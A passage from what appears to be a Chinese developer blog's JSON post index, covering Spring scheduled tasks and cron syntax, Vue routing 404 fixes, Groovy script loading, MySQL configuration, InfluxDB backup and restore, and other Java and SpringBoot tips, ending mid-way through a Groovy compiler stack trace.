简单说一下，用自定义线程池的好处: 合理的分配线程池参数 拒绝策略的选择也比较有意思（可以按照自己的想法来处理”负载”的任务） 线程池命名，对于以后问题排查，会有很大的帮助 6. 小结本来这篇博文在昨天即8月2号就应该写完的，结果晚上生产环境下除了点问题，解决线上故障之后就比较晚了，留到了今天，哎，拖延症也是要不得。。。 下面小结Spring中定时任务的几个知识点 默认所有的定时任务都是串行调度的，一个线程，且即便crond完全相同的两个任务先后顺序也没法保证（具体原因需要源码分析，看下这块是怎么支持） 使用@Async注解可以使定时任务异步调度；但是需要开启配置，在启动类上添加 @EnableAsync 注解 开启并发执行时，推荐用自定义的线程池来替代默认的，理由见上面 II. 其他0. 相关博文 《Spring之定时任务基本使用篇》 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2018/08/03/180803-Spring定时任务高级使用篇/"},{"title":"180801-Spring之定时任务基本使用篇","text":"Spring之定时任务基本使用篇spring-boot项目中，想添加一个定时任务，可以怎么办？ 不管什么项目，都是可以直接用JDK原生的定时任务来实现 借助@Scheduled注解来使用 本篇博文则主要集中在在SpringBoot项目中，怎么使用定时任务 I. 基本使用1. demo在SpringBoot项目中，使用定时任务需要先开启对应的配置，一个简单的demo如下 12345678910111213@EnableScheduling@SpringBootApplicationpublic class QuickMediaApplication { public static void main(String[] args) { SpringApplication.run(QuickMediaApplication.class, args); } @Scheduled(cron = \"0/1 * * * * ?\") public void sc1() throws InterruptedException { System.out.println(Thread.currentThread().getName() + \" | sc1 \" + System.currentTimeMillis()); }} 上面的代码足够简单，基本上没有什么好额外解释的，只是注意下要使用定时任务，必须加上 @EnableScheduling注解 2. cron表达式另外一个有意思的就是@Scheduled注解中的cron是怎么定义的，上面那个是啥意思？ Cron定义如下 12Seconds Minutes Hours DayofMonth Month DayofWeek YearSeconds Minutes Hours DayofMonth Month DayofWeek 上面每个坑位，可以取得值不一样，先分别说明几个可能见到的符号 * : 表示匹配该域的任意值，如分钟的坑位为*, 表示每分钟都会触发 ? : 只能用在DayofMonth和DayofWeek两个域。它也匹配域的任意值，但实际不会。因为DayofMonth和 DayofWeek会相互影响。例如想在每月的20日触发调度，不管20日到底是星期几，则只能使用如下写法： 13 13 15 20 ? -: 表示范围，例如在Minutes域使用5-20，表示从5分到20分钟每分钟触发一次。 /: 表示起始时间开始触发，然后每隔固定时间触发一次 如在Minutes域使用5/20,则意味着5分钟触发一次，而25，45等分别触发一次 ,: 表示列出枚举值值。 如：在Minutes域使用5,20，则意味着在5和20分每分钟触发一次。 L: 表示最后，只能出现在DayofWeek和DayofMonth域， 如在DayofWeek域使用5L,意味着在最后的一个星期四触发。 W: 表示有效工作日(周一到周五),只能出现在DayofMonth域，系统将在离指定日期的最近的有效工作日触发事件 如：在 DayofMonth使用5W，如果5日是星期六，则将在最近的工作日：星期五，即4日触发。如果5日是星期天，则在6日(周一)触发；如果5日在星期一 到星期五中的一天，则就在5日触发。另外一点，W的最近寻找不会跨过月份。 LW: 这两个字符可以连用，表示在某个月最后一个工作日，即最后一个星期五。 #: 用于确定每个月第几个星期几，只能出现在DayofMonth域。例如在4#2，表示某月的第二个星期三。 根据上面的说明，前面的crond表达式含义就比较清楚了 120/1 * * * * ?每s种执行一次 3. 实例说明下面给出一些常见的实例说明 123456789101112131415161718190 0 10,14,16 * * ? 每天上午10点，下午2点，4点 0 0/30 9-17 * * ? 朝九晚五工作时间内每半小时 0 0 12 ? * WED 表示每个星期三中午12点 \"0 0 12 * * ?\" 每天中午12点触发 \"0 15 10 ? * *\" 每天上午10:15触发 \"0 15 10 * * ?\" 每天上午10:15触发 \"0 15 10 * * ? *\" 每天上午10:15触发 \"0 15 10 * * ? 2005\" 2005年的每天上午10:15触发 \"0 * 14 * * ?\" 在每天下午2点到下午2:59期间的每1分钟触发 \"0 0/5 14 * * ?\" 在每天下午2点到下午2:55期间的每5分钟触发 \"0 0/5 14,18 * * ?\" 在每天下午2点到2:55期间和下午6点到6:55期间的每5分钟触发 \"0 0-5 14 * * ?\" 在每天下午2点到下午2:05期间的每1分钟触发 \"0 10,44 14 ? 3 WED\" 每年三月的星期三的下午2:10和2:44触发 \"0 15 10 ? * MON-FRI\" 周一至周五的上午10:15触发 \"0 15 10 15 * ?\" 每月15日上午10:15触发 \"0 15 10 L * ?\" 每月最后一日的上午10:15触发 \"0 15 10 ? * 6L\" 每月的最后一个星期五上午10:15触发 \"0 15 10 ? * 6L 2002-2005\" 2002年至2005年的每月的最后一个星期五上午10:15触发 \"0 15 10 ? * 6#3\" 每月的第三个星期五上午10:15触发 4. 疑问上面只是介绍了简单的使用姿势，但有几个自然而然的疑问有待验证 一个项目中有多个定时任务时，他们是并行执行的还是串行执行的？ 如果默认是串行的 那么有相同的crond表达式的定时任务之间，有先后顺序么？ 某个任务的阻塞是否会影响后面的任务？ 如果需要他们并行执行，可以怎么做？ 如果是并发执行的 是新创建线程还是采用线程池来复用呢？ 在并发执行时，假设有个每秒执行一次的任务，但是它执行一次消耗的时间大于1s时，这个任务的表现时怎样的呢？不断地新增线程来执行还是等执行完毕之后再执行下一次的呢? 上面这些问题先跑出来，留待下次结合实例给出回答 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2018/08/01/180801-Spring之定时任务基本使用篇/"},{"title":"180810-单页面Vue打包子页面提示404问题记录","text":"网上下了个Vue项目，打包为dist之后，扔到ngxin服务器上运行，正常连接访问没啥问题，但是刷新之后提示404 记录下修复过程 1. 路由配置123456789101112131415161718192021export default new VueRouter({ mode: 'history', routes: [ { path: '/', component: Main }, { path: `/ComicsView/:${routerParamsNames.comicsId}`, name: 'comicsView', component: ComicsView }, { path: `/ComicsView/:${routerParamsNames.comicsId}/:${routerParamsNames.chaptor}`, name: 'comicsContent', component: ComicsContent }, { path: '/notFound', alias: '*', name: '404', component: NotFound } ]}); 2. 服务器配置Apache 12345678&lt;IfModule mod_rewrite.c&gt; RewriteEngine On RewriteBase / RewriteRule ^index\\.html$ - [L] RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule . /index.html [L]&lt;/IfModule&gt; 在根目录创建.htaccess文件后粘贴上面的代码 nginx 123location / { try_files $uri $uri/ /index.html;} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/08/10/180810-单页面Vue打包子页面提示404问题记录/"},{"title":"180807-Quick-Task 动态脚本支持框架之Groovy脚本加载执行","text":"Quick-Task 动态脚本支持框架之Groovy脚本加载执行上一篇简答说了如何判断有任务动态添加、删除或更新，归于一点就是监听文件的变化，判断目录下的Groovy文件是否有新增删除和改变，从而判定是否有任务的变更； 接下来的问题就比较明显了，当任务变更之后，就需要重新加载任务了，即如何动态的编译并执行Groovy文件呢？ 相关系列博文： 180628-Quick-Task 动态任务执行框架想法篇 180702-Quick-Task 动态脚本支持框架整体介绍篇 180723-Quick-Task 动态脚本支持框架之结构设计篇 180729-Quick-Task 动态脚本支持框架之任务动态加载 I. Groovy文件动态加载要想动态加载类，可以怎么办？如果对JVM有一定了解的朋友可能知道，自定义一个ClassLoader，可以实现从文件/网络/DB/Jar包中读取class文件，而Groovy，动态语言，简单来说就是.groovy文件可以直接运行，那么我们编码中要怎么玩？ 1. 依赖让我自己来实现Groovy文件的编译执行，目前基本上是看不到啥希望的，所以果断的借助第三方工具类加载Groovy文件 pom文件添加依赖 12345&lt;dependency&gt; &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt; &lt;artifactId&gt;groovy-all&lt;/artifactId&gt; &lt;version&gt;2.4.3&lt;/version&gt;&lt;/dependency&gt; 2. 加载Groovy直接利用上面jar包中提供的GroovyCalssLoader来加载Groovy文件即可，使用也比较简单 12345678910111213141516171819202122232425262728@Slf4jpublic class GroovyCompile { @SuppressWarnings(\"unchecked\") public static &lt;T&gt; T compile(File codeSource, Class&lt;T&gt; interfaceType, ClassLoader classLoader) throws CompileTaskScriptException { try { GroovyClassLoader loader = new GroovyClassLoader(classLoader); Class clz = loader.parseClass(codeSource); // 接口校验 if (!interfaceType.isAssignableFrom(clz)) { throw new CompileTaskScriptException(\"illegal script type!\"); } return (T) clz.newInstance(); } catch (IOException e) { log.error(\"load code from {} error! e: {}\", codeSource, e); throw new CompileTaskScriptException(\"load code from \" + codeSource + \" error!\"); } catch (CompileTaskScriptException e) { throw e; } catch (Exception e) { log.error(\"initial script error! codePath: {}, e: {}\", codeSource, e); throw new CompileTaskScriptException( \"initial script error! clz: \" + codeSource + \" msg: \" + e.getMessage()); } }} 上面看着挺多，关键地方就三行，编译为class对象之后，借助反射来创建对象 123GroovyClassLoader loader = new GroovyClassLoader(classLoader);Class clz = loader.parseClass(codeSource);return (T) clz.newInstance(); 另外还有一行，也可以顺带凑一眼，判断一个class是否为另一个class的子类，用的是 1interfaceType.isAssignableFrom(clz) 而判断某个对象是否为某类的子类用的则是 instance of 3. 调用包装上面既然提供了一个工具类，那么接上篇的获取变动文件之后，获取File对象，借此拿到任务对象，就比较清晰了 123456789101112@Slf4jpublic class ScriptLoadUtil { public static ITask loadScript(File file) { try { return GroovyCompile.compile(file, ITask.class, ScriptLoadUtil.class.getClassLoader()); } catch (CompileTaskScriptException e) { log.error(\"un-expect error! e: {}\", e); return null; } }} 4. 小结本篇内容比较简单，知识点也没多少，一个是利用GroovyClassLoader来编译Groovy文件并获取实例；另一个就是如何判断一个class是否为另一个class的子类 还有一个隐藏的点上面没有说，那就是上面的GroovyCompile文件中，每次加载Groovy文件时，都是新创建了一个GroovyClassLoader，并由它来加载并实例Groovy任务，那么问题来了 能否用一个GoorvyClassLoader来管理所有的Groovy任务呢？ 上面的代码实现中，不同的Groovy任务之间，可以相互通信么？ 针对上面的问题，暂不给出答案，后面再说 II. 其他0. 相关博文： 180628-Quick-Task 动态任务执行框架想法篇 180702-Quick-Task 动态脚本支持框架整体介绍篇 180723-Quick-Task 动态脚本支持框架之结构设计篇 180729-Quick-Task 动态脚本支持框架之任务动态加载 项目： https://github.com/liuyueyi/quick-task 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/08/07/180807-Quick-Task-动态脚本支持框架之Groovy脚本加载执行/"},{"title":"180826-mysql配置修改小记","text":"本篇将介绍mysql配置常用修改姿势 1. 端口号修改默认的端口号为3306，如果需要修改端口号，则找到my.cnf文件，新加一个配置即可: 1234567vim /etc/my.cnf## 找到指定的位置，修改端口号[mysqld]port=3305datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.sock 服务重启 1service mysqld restart 2. 密码修改使用set password 格式： 1mysql&gt; set password for 用户名@localhost = password(&apos;新密码&apos;); 例子： 1mysql&gt; set password for root@localhost = password('123'); update 方式 12345mysql&gt; use mysql; mysql&gt; update user set password=password('123') where user='root' and host='localhost'; mysql&gt; flush privileges; 添加用户 12alter user 'root'@'localhost' identified by 'test';create user 'test'@'%' IDENTIFIED BY 'test'; 授予权限 123# root 方式登录grant all PRIVILEGES on test.* to 'finbtc'@'%' IDENTIFIED by 'test';flush privileges; II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/08/26/180826-mysql配置修改小记/"},{"title":"180808-Java实现一个MD5工具类","text":"I. MD5工具类利用JDK封装一个简易的MD5工具类，逻辑比较简单，直接贴下具体实现 12345678910111213141516171819202122232425public static String getMD5(String content) { String result = \"\"; try { MessageDigest md = MessageDigest.getInstance(\"md5\"); md.update(content.getBytes()); byte[] bytes = md.digest(); StringBuilder sb = new StringBuilder(); for (byte b : bytes) { String str = Integer.toHexString(b &amp; 0xFF); if (str.length() == 1) { sb.append(\"0\"); } sb.append(str); } result = sb.toString(); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); } return result;}@Testpublic void testMd5() { System.out.println(getMD5(\"hello world\"));} 测试输出为: 15eb63bbbe01eeed093cb22bb8f5acdc3 顺手使用shell验证一下 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/08/08/180808-Java实现一个MD5工具类/"},{"title":"180727-时序数据库InfluxDB之备份和恢复策略","text":"influxdb 备份与恢复参考： influxdb backup and restore 环境: influxdb v1.6.0 使用influx自动的控制台进行 I. 备份备份命令 1234567influxd backup [ -database &lt;db_name&gt; ] --&gt; 指定需要备份的数据库名 [ -portable ] --&gt; 表示在线备份 [ -host &lt;host:port&gt; ] --&gt; influxdb服务所在的机器，端口号默认为8088 [ -retention &lt;rp_name&gt; ] | [ -shard &lt;shard_ID&gt; -retention &lt;rp_name&gt; ] --&gt; 备份的保留策略，注意shard是挂在rp下的；我们需要备份的就是shard中的数据 [ -start &lt;timestamp&gt; [ -end &lt;timestamp&gt; ] | -since &lt;timestamp&gt; ] --&gt; 备份指定时间段的数据 &lt;path-to-backup&gt; --&gt; 备份文件的输出地址 1. 实例演示首先创建一个数据库 yhhblog， 里面包含两个measurement，对应的数据如下 12345678910111213141516171819202122232425262728&gt; show databasesname: databasesname----_internalyhhblog&gt; use yhhblogUsing database yhhblog&gt; show measurementsname: measurementsname----netLoadserviceLoad&gt; select * from netLoadname: netLoadtime host netIn netOut service---- ---- ----- ------ -------1532658769048100401 127.0.0.1 13m 521K app.service.about&gt; select * from serviceLoadname: serviceLoadtime cpu host load mem qps rt service---- --- ---- ---- --- --- -- -------1532658713805369067 45.23 127.0.0.2 1.21 4145m 1341 1312 app.service.about1532658718726259226 45.23 127.0.0.1 1.21 4145m 1341 1312 app.service.about a. 备份所有的数据库将influxdb中的所有的数据库都备份下来，不加任何的参数 1influxd backup -portable /tmp/data/total b. 备份指定数据库如果只想要备份上面的yhhblog数据库, 添加 -database 参数指定即可 123456789# influxd backup -portable -database yhhblog /tmp/data/yhhblog2018/07/27 10:38:15 backing up metastore to /tmp/data/yhhblog/meta.002018/07/27 10:38:15 backing up db=yhhblog2018/07/27 10:38:15 backing up db=yhhblog rp=autogen shard=10 to /tmp/data/yhhblog/yhhblog.autogen.00010.00 since 0001-01-01T00:00:00Z2018/07/27 10:38:15 backup complete:2018/07/27 10:38:15 /tmp/data/yhhblog/20180727T023815Z.meta2018/07/27 10:38:15 /tmp/data/yhhblog/20180727T023815Z.s10.tar.gz2018/07/27 10:38:15 /tmp/data/yhhblog/20180727T023815Z.manifest c. 备份数据库中指定时间段的数据对上面的数据，只备份部分时间满足要求的数据，可以添加start/end参数 123456789# influxd backup -portable -database yhhblog -start 2018-07-27T2:31:57Z -end 2018-07-27T2:32:59Z /tmp/data/yhhblog_per2018/07/27 10:42:14 backing up metastore to /tmp/data/yhhblog_per/meta.002018/07/27 10:42:14 backing up db=yhhblog2018/07/27 10:42:14 backing up db=yhhblog rp=autogen shard=10 to /tmp/data/yhhblog_per/yhhblog.autogen.00010.00 with boundaries start=2018-07-27T02:31:57Z, end=2018-07-27T02:32:59Z2018/07/27 10:42:14 backup complete:2018/07/27 10:42:14 /tmp/data/yhhblog_per/20180727T024214Z.meta2018/07/27 10:42:14 /tmp/data/yhhblog_per/20180727T024214Z.s10.tar.gz2018/07/27 10:42:14 /tmp/data/yhhblog_per/20180727T024214Z.manifest 现在备份ok了，问题就是如何确认备份的问题有没有问题呢，备份后的数据如何恢复呢？ II. 恢复命令如下 123456789influxd restore [ -db &lt;db_name&gt; ] --&gt; 待恢复的数据库(备份中的数据库名) -portable | -online [ -host &lt;host:port&gt; ] --&gt; influxdb 的服务器 [ -newdb &lt;newdb_name&gt; ] --&gt; 恢复到influxdb中的数据库名 [ -rp &lt;rp_name&gt; ] --&gt; 备份中的保留策略 [ -newrp &lt;newrp_name&gt; ] --&gt; 恢复的保留策略 [ -shard &lt;shard_ID&gt; ] &lt;path-to-backup-files&gt; 首先拿简单的方式来演示恢复策略，并查看下上面的备份数据是否有问题 1. 恢复到不存在的database下面演示下将前面的导出的备份，恢复到一个新的数据库 yhhblog_bk上，执行命令如下 1influxd restore -portable -db yhhblog -newdb yhhblog_bk yhhblog_per 顺带验证下上面备份的数据是否有问题，注意到我们恢复的是时间片段的数据备份，因此恢复的数据，应该会排除掉不再上面日期内的数据 12345678910111213141516171819202122232425&gt; show databasesname: databasesname----_internalyhhblogyhhblog_bk&gt; use yhhblog_bkUsing database yhhblog_bk&gt; show measurementsname: measurementsname----netLoadserviceLoad&gt; select * from netLoadname: netLoadtime host netIn netOut service---- ---- ----- ------ -------1532658769048100401 127.0.0.1 13m 521K app.service.about&gt; select * from serviceLoadname: serviceLoadtime cpu host load mem qps rt service---- --- ---- ---- --- --- -- -------1532658718726259226 45.23 127.0.0.1 1.21 4145m 1341 1312 app.service.about 注意看前面serviceLoad里面只有一条数据, 即表明我们按照时间进行备份没啥问题 2. 恢复到存在的DB看官网恢复的文档中，如果想将备份恢复到一个已经存在的database中时，并不是上面那么简单的就可以了，这里采用的一个策略是西安备份到一个临时的db中；然后将临时DB中的数据写入已存在的db中 具体的演示步骤如下 （注意本小结的执行可以直接依赖前面恢复的备份数据库中） 将备份恢复到已经存在的数据库 yhhblogNew 中 12# 首先是将备份恢复到一个不存在的数据库 yhhblog_bk 中influxd restore -portable -db yhhblog -newdb yhhblog_bk yhhblog_per 进入 influx 控制台，执行拷贝和删除临时数据库 1234567# 准备 yhhblogNew 数据库&gt; create database yhhblogNew# 将临时数据库中的数据导入已存在的数据库中&gt; use yhhblog_bk&gt; SELECT * INTO yhhblogNew..:MEASUREMENT FROM /.*/ GROUP BY *&gt; drop yhhblog_bk 3. 保留策略已存在时，恢复1influxd restore -portable -db yhhblog -newdb yhhblog_tmp -rp autogen -newrp autogen_tmp yhhblog 进入influx控制台，执行拷贝 123&gt; user yhhblog_tmp&gt; SELECT * INTO yhhblogNew.autogen.:MEASUREMENT FROM /yhhblog_tmp.autogen_tmp.*/ GROUP BY *&gt; drop database yhhblog_tmp 4. 其他官方还写了其他两种恢复方式，一个被废弃，一个离线的会导致数据丢失，也不推荐使用，而现在大部分的博文中备份和恢复都是这种过时的方案，不太友好，这里不详细叙述 III. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/07/27/180727-时序数据库InfluxDB之备份和恢复策略/"},{"title":"180827-Java获取类路劲的几种姿势小结","text":"I. Java获取类路劲的几种姿势小结在Java环境中，如何获取当前类的路径，如何获取项目根路径，可以说是比较常见的需求场景了，下面简单的记录一下 123456789101112131415161718192021222324252627@Testpublic void showURL() throws IOException { // 第一种：获取类加载的根路径 File f = new File(this.getClass().getResource(\"/\").getPath()); System.out.println(f); // 获取当前类的所在工程路径; 如果不加“/” 获取当前类的加载目录 File f2 = new File(this.getClass().getResource(\"\").getPath()); System.out.println(f2); // 第二种：获取项目路径 File directory = new File(\"\");// 参数为空 String courseFile = directory.getCanonicalPath(); System.out.println(courseFile); // 第三种： URL xmlpath = this.getClass().getClassLoader().getResource(\"\"); System.out.println(xmlpath); // 第四种： System.out.println(System.getProperty(\"user.dir\")); // 第五种： 获取所有的类路径 包括jar包的路径 System.out.println(System.getProperty(\"java.class.path\"));} 输出如下: 123456/Users/user/Project/hui/testApp/pair/target/test-classes/Users/user/Project/hui/testApp/pair/target/test-classes/net/finbtc/coin/test/Users/user/Project/hui/testApp/pairfile:/Users/user/Project/hui/testApp/pair/target/test-classes//Users/user/Project/hui/testApp/pair/Applications/IntelliJ IDEA.app/Contents/lib/idea_rt.jar:... （太长省略） II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/08/27/180827-Java获取类路劲的几种姿势小结/"},{"title":"180830-SpringBoot之获取application.yml配置参数","text":"SpringBoot之获取Application.yml配置参数需要获取配置文件中的配置参数的场景挺多的，常见的一种方式就是直接从Enironment对象中获取，或者使用 @Value 注解的方式注入，但是这都有一个前提，需要确切的知道配置的name 如果某些场景下，我需要遍历配置参数可以怎么办？ I. 获取配置参数首先可以明确的一点就是通过Environment可以获取所有的配置（不然怎么根据配置名获取配置参数？！），所以问题的关键就是如何捞出Environment中的数据了， 因此第一步就是需要获取Environment对象，然后看Environment对象中是否提供了类似的接口，直接看接口定义，没有直接获取所有配置的接口（不然也就不会写这个东西了），没办法，只能开启debug模式，看数据了 123456789101112131415161718192021222324252627282930313233343536373839404142package com.github.hui.story.quickstory;import com.git.hui.story.cache.redis.QuickRedisClient;import lombok.extern.slf4j.Slf4j;import org.mybatis.spring.annotation.MapperScan;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.boot.builder.SpringApplicationBuilder;import org.springframework.boot.web.servlet.ServletComponentScan;import org.springframework.boot.web.servlet.support.SpringBootServletInitializer;import org.springframework.core.env.Environment;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.scheduling.annotation.EnableScheduling;@SpringBootApplication(scanBasePackages = {\"com.git.hui.story\", \"com.github.hui.story\"})@MapperScan(basePackages = \"com.git.hui.story.dao.mapper\")@ServletComponentScan@EnableScheduling@Slf4jpublic class QuickStoryApplication extends SpringBootServletInitializer { @Autowired public void setEnvironment(Environment environment) { String host = environment.getProperty(\"spring.redis.host\"); log.info(\"host: {}\", host); } @Autowired public void setRedisTemplate(RedisTemplate&lt;String, String&gt; redisTemplate) { QuickRedisClient.register(redisTemplate); } @Override protected SpringApplicationBuilder configure(SpringApplicationBuilder application) { return application.sources(QuickStoryApplication.class); } public static void main(String[] args) { SpringApplication.run(QuickStoryApplication.class, args); }} 上面的代码中，只需要关注下setEnvironment方法即可，其他的就没什么关系了，debug的截图如下 从截图中可以看出，所有的配置都有，只是分布在了两个PropertySource中，一个是名为application.yml,另外一个就是名为application-dev.yml 正好和我们项目实际使用的配置文件对应上了，一个是基本的，一个是分环境的配置，所以思路就来了，直接根据name找到对应的配置容器，然后捞出来即可 简单的实现如下 1234567891011121314151617181920@Autowiredpublic void setEnvironment(Environment environment) { String host = environment.getProperty(\"spring.redis.host\"); log.info(\"host: {}\", host); PropertySource source = ((StandardServletEnvironment) environment).getPropertySources() .get(\"applicationConfig: [classpath:/application.yml]\"); Map&lt;String, String&gt; appMap = (Map&lt;String, String&gt;) source.getSource(); if (environment.getActiveProfiles().length &gt; 0) { PropertySource activeSource = ((StandardServletEnvironment) environment).getPropertySources() .get(\"applicationConfig: [classpath:/application-\" + environment.getActiveProfiles()[0] + \".yml]\"); Map&lt;String, String&gt; activeAppMap = (Map&lt;String, String&gt;) activeSource.getSource(); appMap.putAll(activeAppMap); } log.info(\"config: {}\", appMap);} 再次debug截图如下 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/08/30/180830-SpringBoot之获取application-yml配置参数/"},{"title":"180907-IDEA编译Groovy脚本失败记录","text":"在做 https://github.com/liuyueyi/quick-task 项目时，遇到了一个蛋疼的问题，不知道什么时候加了个Groovy脚本之后，整个项目就编译不过了，特此记录一下 在启动时，提示下面的编译信息 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Error:Groovyc: While compiling script: java.lang.IllegalArgumentException: The max number of supported arguments is 255, but found 388 at org.codehaus.groovy.classgen.asm.CallSiteWriter.getCreateArraySignature(CallSiteWriter.java:74) at org.codehaus.groovy.classgen.asm.CallSiteWriter.makeCallSite(CallSiteWriter.java:336) at org.codehaus.groovy.classgen.asm.InvocationWriter.makeCachedCall(InvocationWriter.java:340) at org.codehaus.groovy.classgen.asm.InvocationWriter.makeCall(InvocationWriter.java:430) at org.codehaus.groovy.classgen.asm.InvocationWriter.makeCall(InvocationWriter.java:137) at org.codehaus.groovy.classgen.asm.InvocationWriter.makeInvokeMethodCall(InvocationWriter.java:121) at org.codehaus.groovy.classgen.asm.InvocationWriter.writeInvokeMethod(InvocationWriter.java:497) at org.codehaus.groovy.classgen.AsmClassGenerator.visitMethodCallExpression(AsmClassGenerator.java:814) at org.codehaus.groovy.ast.expr.MethodCallExpression.visit(MethodCallExpression.java:70) at org.codehaus.groovy.classgen.asm.BinaryExpressionHelper.evaluateEqual(BinaryExpressionHelper.java:361) at org.codehaus.groovy.classgen.AsmClassGenerator.visitDeclarationExpression(AsmClassGenerator.java:680) at org.codehaus.groovy.ast.expr.DeclarationExpression.visit(DeclarationExpression.java:89) at org.codehaus.groovy.classgen.asm.StatementWriter.writeExpressionStatement(StatementWriter.java:621) at org.codehaus.groovy.classgen.asm.OptimizingStatementWriter.writeExpressionStatement(OptimizingStatementWriter.java:411) at org.codehaus.groovy.classgen.AsmClassGenerator.visitExpressionStatement(AsmClassGenerator.java:667) at org.codehaus.groovy.ast.stmt.ExpressionStatement.visit(ExpressionStatement.java:42) at org.codehaus.groovy.classgen.asm.StatementWriter.writeBlockStatement(StatementWriter.java:93) at org.codehaus.groovy.classgen.asm.OptimizingStatementWriter.writeBlockStatement(OptimizingStatementWriter.java:205) at org.codehaus.groovy.classgen.AsmClassGenerator.visitBlockStatement(AsmClassGenerator.java:613) at org.codehaus.groovy.ast.stmt.BlockStatement.visit(BlockStatement.java:71) at org.codehaus.groovy.ast.ClassCodeVisitorSupport.visitClassCodeContainer(ClassCodeVisitorSupport.java:104) at org.codehaus.groovy.ast.ClassCodeVisitorSupport.visitConstructorOrMethod(ClassCodeVisitorSupport.java:115) at org.codehaus.groovy.classgen.AsmClassGenerator.visitStdMethod(AsmClassGenerator.java:477) at org.codehaus.groovy.classgen.AsmClassGenerator.visitConstructorOrMethod(AsmClassGenerator.java:413) at org.codehaus.groovy.ast.ClassCodeVisitorSupport.visitMethod(ClassCodeVisitorSupport.java:126) at org.codehaus.groovy.classgen.AsmClassGenerator.visitMethod(AsmClassGenerator.java:554) at org.codehaus.groovy.ast.ClassNode.visitContents(ClassNode.java:1081) at org.codehaus.groovy.ast.ClassCodeVisitorSupport.visitClass(ClassCodeVisitorSupport.java:53) at org.codehaus.groovy.classgen.AsmClassGenerator.visitClass(AsmClassGenerator.java:259) at org.codehaus.groovy.control.CompilationUnit$17.call(CompilationUnit.java:848) at org.codehaus.groovy.control.CompilationUnit.applyToPrimaryClassNodes(CompilationUnit.java:1087) at org.codehaus.groovy.control.CompilationUnit.doPhaseOperation(CompilationUnit.java:624) at org.codehaus.groovy.control.CompilationUnit.processPhaseOperations(CompilationUnit.java:602) at org.codehaus.groovy.control.CompilationUnit.compile(CompilationUnit.java:579) at org.jetbrains.groovy.compiler.rt.GroovyCompilerWrapper.compile(GroovyCompilerWrapper.java:62) at org.jetbrains.groovy.compiler.rt.DependentGroovycRunner.runGroovyc(DependentGroovycRunner.java:115) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.jetbrains.groovy.compiler.rt.GroovycRunner.intMain2(GroovycRunner.java:134) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at 